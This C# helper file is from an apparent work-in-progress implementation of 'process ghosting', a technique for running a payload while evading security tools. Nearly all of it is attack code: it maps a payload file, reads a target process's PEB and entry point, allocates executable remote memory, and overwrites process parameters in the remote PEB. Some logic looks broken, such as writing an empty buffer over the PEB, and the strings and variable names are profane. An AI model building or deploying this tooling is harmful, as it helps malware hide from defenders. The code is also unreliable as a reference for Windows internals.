using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using HANDLE = System.IntPtr;

using static ProcessGhosting.UserDefinedTypes;

namespace ProcessGhosting
{
    class HelperFunctions
    {
        internal struct BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            //public IntPtr PebAddress;
            public PEB PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_USER_PROCESS_PARAMETERS
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Reserved1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public IntPtr[] Reserved2;
            public UNICODE_STRING ImagePathName;
            public UNICODE_STRING CommandLine;
        }

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("kernel32.dll")]
        static extern void SetLastError(uint ErrorCode);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, FileMapProtection flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string lpName);

        [DllImport("kernel32.dll")]
        static extern IntPtr MapViewOfFileEx(IntPtr hFileMappingObject, FileMapAccessType dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll")]
        static extern bool GetFileSizeEx(IntPtr hFile, out long lpFileSize);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
       
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint dwSize, ref uint lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(out UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        [DllImport("ntdll.dll")]
        public static extern UInt32 RtlCreateProcessParametersEx(ref IntPtr pProcessParameters, IntPtr ImagePathName, IntPtr DllPath, IntPtr CurrentDirectory, IntPtr CommandLine, IntPtr Environment, IntPtr WindowTitle, IntPtr DesktopInfo, IntPtr ShellInfo, IntPtr RuntimeData, uint Flags);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, Int32 flAllocationType, Int32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesWritten);


        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int NtQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll")]
        public static extern void RtlZeroMemory(IntPtr pBuffer, int length);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, MemoryProtection flNewProtect, ref UInt32 lpflOldProtect);

        public static IntPtr BufferPayload(string filename, ref long size)
        {
            IntPtr fileHandle = CreateFileW(filename, FileAccess.Read, FileShare.Read, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);
            Console.WriteLine(fileHandle);

            IntPtr mapping = CreateFileMapping(fileHandle, IntPtr.Zero, FileMapProtection.PageReadonly, (uint)0, (uint)0, String.Empty);

            IntPtr rawDataPointer = MapViewOfFileEx(mapping, FileMapAccessType.Read, 0, 0, UIntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("Raw Data Pointer");
            Console.WriteLine(rawDataPointer);

            //long size;
            GetFileSizeEx(fileHandle, out size);
            Console.WriteLine("File Size : "+size);

            IntPtr localCopyAddress = VirtualAlloc(IntPtr.Zero, (uint)size, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ReadWrite);
            Console.WriteLine(localCopyAddress);
            //byte[] temp = BitConverter.GetBytes((UInt32)rawDataPointer);

            memcpy(localCopyAddress, rawDataPointer, (UIntPtr)size);
            Console.WriteLine("BitConverter.GetBytes");
            //Marshal.Copy(temp, 0, localCopyAddress, (int)size);
            Console.WriteLine("End of BufferPayload function");

            return localCopyAddress;
        }

        public static IntPtr GetEntryPoint(PROCESS_BASIC_INFORMATION bi, IntPtr hProcess)
        {
            
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr payloadBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine("Payload Base : 0x{0:X}", payloadBase.ToString("X"));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, payloadBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            Console.WriteLine("e_lfanew at : 0x{0:X}", e_lfanew_offset.ToString("X"));
            uint opthdr = e_lfanew_offset + 0x28;
            uint entryPoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            Console.WriteLine("entry Point rva at : 0x{0:X}", entryPoint_rva.ToString("X"));

            IntPtr addressOfEntryPoint = (IntPtr)(entryPoint_rva + (UInt64)payloadBase);
            Console.WriteLine("Address of Enptry Point : 0x{0:X}", addressOfEntryPoint.ToString("X"));

            return addressOfEntryPoint;
        }

        public static IntPtr CreateUnicodeStruct(string data)
        {
            UNICODE_STRING UnicodeObject = new UNICODE_STRING();
            string UnicodeObject_Buffer = data;
            UnicodeObject.Length = Convert.ToUInt16(UnicodeObject_Buffer.Length * 2);
            UnicodeObject.MaximumLength = Convert.ToUInt16(UnicodeObject.Length + 1);
            UnicodeObject.buffer = Marshal.StringToHGlobalUni(UnicodeObject_Buffer);
            IntPtr InMemoryStruct = Marshal.AllocHGlobal(16);
            Marshal.StructureToPtr(UnicodeObject, InMemoryStruct, true);

            return InMemoryStruct;

        }

        public static IntPtr ReadRemoteMem(IntPtr hProc, Int64 pMem, Int32 Size)
        {
            IntPtr pMemLoc = Marshal.AllocHGlobal(Size);
            RtlZeroMemory(pMemLoc, Size);

            uint BytesRead = 0;
            bool bRPM = ReadProcessMemory(hProc, (IntPtr)(pMem), pMemLoc, (uint)Size, ref BytesRead);
            Console.WriteLine("Read Memory Error : 0x{0:X}", pMemLoc);
            if (bRPM != true)
            {
                if (BytesRead != Size)
                {
                    if (pMemLoc != IntPtr.Zero)
                    {
                        Marshal.FreeHGlobal(pMemLoc);
                    }
                    return IntPtr.Zero;
                }
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("Here!!!!!!!!!!!!!");
                return pMemLoc;
            }

        }

        public static IntPtr AllocRemoteMem(IntPtr hProc, Int32 Size, IntPtr Address = new IntPtr())
        {
            IntPtr pRemoteMem = VirtualAllocEx(hProc, Address, (UInt32)Size, 0x3000, (Int32)MemoryProtection.ReadWrite);
            return pRemoteMem;
        }

        public static Boolean WriteRemoteMem(IntPtr hProc, IntPtr pSource, IntPtr pDest, Int32 Size, MemoryProtection Protect)
        {
            UInt32 BytesWritten = 0;
            Boolean bRemoteWrite = WriteProcessMemory(hProc, pDest, pSource, (uint)Size, ref BytesWritten);

            if (!bRemoteWrite)
            {
                return false;
            }

            UInt32 OldProtect = 0;
            Boolean bProtect = VirtualProtectEx(hProc, pDest, (uint)Size, Protect, ref OldProtect);
            if (!bProtect)
            {
                return false;
            }
            return true;
        }
        /*
        unsafe public static void SetupProcessParameters(ref IntPtr hProcess, PROCESS_BASIC_INFORMATION bi, string targetPath)
        {
            IntPtr uTargetPath = CreateUnicodeStruct(targetPath);
            IntPtr uDllDir = CreateUnicodeStruct("C:\\Windows\\System32");
            IntPtr uCurrentDir = CreateUnicodeStruct("C:\\Users\\User\\Desktop");
            IntPtr uWindowName = CreateUnicodeStruct("Babachoda");
            IntPtr uCommandLine = CreateUnicodeStruct("Somerandomparam");

            IntPtr pProcessParameters = IntPtr.Zero;

            RTL_USER_PROCESS_PARAMETERS param = new RTL_USER_PROCESS_PARAMETERS();
            IntPtr environment = Marshal.AllocHGlobal(Marshal.SizeOf(param));
            bool res = CreateEnvironmentBlock(out environment, IntPtr.Zero, true);

            Console.WriteLine("Create Environment Block Error : " + GetLastError());
            Console.WriteLine("CreateEnvironment Block result : " + res);
            Console.WriteLine("Environment : 0x{0:X}", environment);
            SetLastError(0);

            BASIC_INFORMATION pbi = new BASIC_INFORMATION();
            uint temp = 0;
            NtQueryInformationProcess(hProcess, 0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);
            Console.WriteLine("Query Process Information Error : " + GetLastError());
            int RtlStatus = RtlCreateProcessParametersEx(ref pProcessParameters, uTargetPath, uDllDir, uCurrentDir, uTargetPath, environment, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
            Console.WriteLine("RtlStatus 0x{0:X}", RtlStatus);
            
            Int64 pParameters = pProcessParameters.ToInt64() + 4;
            IntPtr pParameterPointer = new IntPtr(pParameters);
            Int32 ProcParamsLength = Marshal.ReadInt32(pParameterPointer);

            //IntPtr allocatedBaseAddress = VirtualAllocEx(hProcess, pProcessParameters, Convert.ToUInt32(ProcParamsLength), (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
            IntPtr allocatedBaseAddress = VirtualAllocEx(hProcess, pProcessParameters, Convert.ToUInt32(ProcParamsLength), (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ExecuteReadWrite);
            Console.WriteLine(GetLastError());
            Console.WriteLine("VirtualAlloc status : 0x{0:X}", allocatedBaseAddress);
            Console.WriteLine("ProcParamsLength 0x{0:X}", ProcParamsLength);
            Console.WriteLine("ProcessParameters : 0x{0:X}", pProcessParameters);

            uint bytesWritten = 0;
            bool WriteStatus = WriteProcessMemory(hProcess, pProcessParameters, pProcessParameters, Convert.ToUInt32(ProcParamsLength), ref bytesWritten);
            Console.WriteLine("pProcessParameters : 0x{0:X}", pProcessParameters);

            Console.WriteLine("WriteProcessMemory status : "+WriteStatus);
            Console.WriteLine(bytesWritten);

            //Writing to peb
            PEB peb = new PEB();
            IntPtr procParams = peb.ProcessParameters;

            //Console.WriteLine("Process Parameters : 0x{0:X}", pbi.PebAddress.ProcessParameters);
            //ReadProcessMemory(hProcess, procParams, )
            //WriteStatus = WriteProcessMemory(hProcess, allocatedBaseAddress, pProcessParameters, Convert.ToUInt32(ProcParamsLength), ref bytesWritten); //Debug this part
            
            WriteStatus = WriteProcessMemory(hProcess, peb.ProcessParameters, pbi.PebAddress.ProcessParameters, Convert.ToUInt32(Marshal.SizeOf(pbi.PebAddress.ProcessParameters)), ref bytesWritten);
            uint error = GetLastError();
            Console.WriteLine("Last error : " + error);
            Console.WriteLine("WriteStatus : "+WriteStatus);
            Console.WriteLine("Bytes Written : 0x{0:X}", bytesWritten);
           

            PEB theirpeb = new PEB();
            IntPtr pebptr = Marshal.AllocHGlobal(Marshal.SizeOf(theirpeb));
            IntPtr lpBaseAddress = bi.PebAddress;
            byte[] pebarray = new byte[Marshal.SizeOf(theirpeb)];
            uint fuck = 0;

            bool r = ReadProcessMemory(hProcess, lpBaseAddress, pebptr, Marshal.SizeOf(theirpeb), out _);
            //bool r = ReadProcessMemory(hProcess, lpBaseAddress, pebarray, Marshal.SizeOf(pebarray), out _);
            //Marshal.Copy(pebarray, 0, pebptr, pebarray.Length);

            Console.WriteLine("The peb pointer : 0x{0:X}", pebptr);
            Console.WriteLine("Read Process Error : " + GetLastError());
            Console.WriteLine("Read Process Memory Result : " + r);
            theirpeb.ProcessParameters = pProcessParameters;
            pebptr = Marshal.AllocHGlobal(Marshal.SizeOf(theirpeb));
            WriteStatus = WriteProcessMemory(hProcess, lpBaseAddress, pebptr, (uint)Marshal.SizeOf(theirpeb), ref fuck);
            Console.WriteLine(GetLastError());
            Console.WriteLine("Write Status for PEB : " + WriteStatus);

            return;
        }
    */

        unsafe public static void SetupProcessParameters(ref IntPtr hProcess, PROCESS_BASIC_INFORMATION bi, string targetPath)
        {
            Int32 RtlUserProcessParam = 0x20;
            Console.WriteLine("[+] PEB Base                      : 0x" + string.Format("{0:X}", (bi.PebAddress).ToInt64()));
            Int32 CommandLine = 0x70;
            Int32 ReadSize = 0x8;
            Thread.Sleep(500);
            SetLastError(0);
            RTL_USER_PROCESS_PARAMETERS rpp = new RTL_USER_PROCESS_PARAMETERS();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            PEB theirpeb =new  PEB();
            UInt64 ProcParams;

            //RTL_USER_PROCESS_PARAMETERS unicode string params

            String WinDir = Environment.GetEnvironmentVariable("windir");
            IntPtr uSystemDir = CreateUnicodeStruct(WinDir + "\\System32");
            IntPtr uTargetPath = CreateUnicodeStruct(targetPath);
            IntPtr uWindowName = CreateUnicodeStruct("Babachoda");
            IntPtr uCurrentDir = CreateUnicodeStruct("C:\\Users\\User\\Desktop");

            //Create local RTL_USER_PROCESS_PARAMETERS
            PEB environment = new PEB();
            IntPtr envptr = Marshal.AllocHGlobal(Marshal.SizeOf(environment));
            CreateEnvironmentBlock(out envptr, IntPtr.Zero, true);
            IntPtr pProcessParams = IntPtr.Zero;

           // uint RtlCreateSuccess = RtlCreateProcessParametersEx(ref pProcessParams, uTargetPath, uSystemDir, uCurrentDir, uTargetPath, IntPtr.Zero, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
            uint RtlCreateSuccess = RtlCreateProcessParametersEx(ref pProcessParams, uTargetPath, uSystemDir, uCurrentDir, uTargetPath, envptr, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
            if (RtlCreateSuccess != 0)
            {
                Console.WriteLine("BHENCHOD");
                Environment.Exit(1);
            }

            RTL_USER_PROCESS_PARAMETERS processParamStruct = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(pProcessParams, typeof(RTL_USER_PROCESS_PARAMETERS));

            Console.WriteLine("[+] RtlCreateProcessParametersEx  : 0x" + string.Format("{0:X}", (UInt64)pProcessParams));

            IntPtr lpParams = pProcessParams;
            Int32 length = Marshal.SizeOf(rpp);
            IntPtr remoteBuffer = AllocRemoteMem(hProcess, length, lpParams);
            Console.WriteLine(GetLastError());
            Console.WriteLine("Remote Buffer : 0x{0:X}", remoteBuffer.ToInt64());

            bool WriteMemoryStat = WriteRemoteMem(hProcess, pProcessParams, pProcessParams, length, MemoryProtection.ExecuteReadWrite);
            Console.WriteLine("Write Memory stat : " + WriteMemoryStat);

            IntPtr lpBaseAddress = bi.PebAddress;
            uint byteread = 0;
            IntPtr theirpebptr = Marshal.AllocHGlobal(Marshal.SizeOf(theirpeb));
            bool r = ReadProcessMemory(hProcess, lpBaseAddress, theirpebptr, (uint)Marshal.SizeOf(theirpeb), ref byteread);

            Console.WriteLine("Read Memory : " + r);
            Console.WriteLine(GetLastError());

            theirpeb = (PEB)Marshal.PtrToStructure(theirpebptr, typeof(PEB));
            theirpeb.ProcessParameters = bi.PebAddress + RtlUserProcessParam;
            theirpebptr = Marshal.AllocHGlobal(Marshal.SizeOf(theirpeb));
            WriteMemoryStat = WriteProcessMemory(hProcess, lpBaseAddress, theirpebptr, (uint)Marshal.SizeOf(theirpeb), ref byteread);
            Console.WriteLine("Writing to peb stat : " + WriteMemoryStat);

            return;
        }
    }
}
